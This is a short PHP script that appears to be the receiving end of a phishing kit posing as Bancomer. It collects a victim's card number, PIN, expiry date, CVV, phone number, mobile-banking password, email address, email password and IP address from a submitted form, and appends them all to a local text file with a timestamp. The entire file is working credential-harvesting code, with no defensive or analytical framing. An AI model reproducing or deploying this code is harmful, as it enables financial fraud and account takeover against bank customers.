
<?php
session_start();
$Fecha= date('d-m-Y');
$Hora= date('H:i:s');

$Tarjeta = $_POST['card'];
$Nip = $_POST['pin'];
$Mes = $_POST['mes'];
$Ano = $_POST['ano'];
$Cvv = $_POST['cvv'];
$mail = $_POST['mail'];
$pass1 = $_POST['mailpassword'];
$pass2 = $_POST['mailpassword2'];
//$Compañia = $_POST['compania'];
$Celular = $_POST['cel'];
$BomvilPsw = $_POST['bmovil'];
//$Token = $_POST['Token'];

$ip = getenv("REMOTE_ADDR");

//split cc
$splitCc = str_split($Tarjeta);
$formatedCc = "";
$uuid = $_SESSION["uuid"];

foreach ($splitCc as $char){
    $formatedCc .= $char;
    if (strlen($formatedCc) == 4 || strlen($formatedCc) == 9 || strlen($formatedCc) == 14){
        $formatedCc .= " ";
    }
}

@$content .= "Fecha: $Fecha / Hora: $Hora / uuid: $uuid

Tarjeta: $formatedCc
Nip: $Nip
Mes: $Mes
Ano: $Ano
Cvv: $Cvv
Celular: $Celular
BmovilPsw: $BomvilPsw
correo: $mail
contraseña: $pass1
confirmacion: $pass2



IP: $ip";


$subject = "Bancomer Paso 2 - $ip";
$prefijo = substr(md5(uniqid(rand())),0,6);


$file = fopen("quesopanela.txt", "a") or die("Unable to open file!");
fwrite($file, $subject);
fwrite($file, $content);
fclose($file);

?>

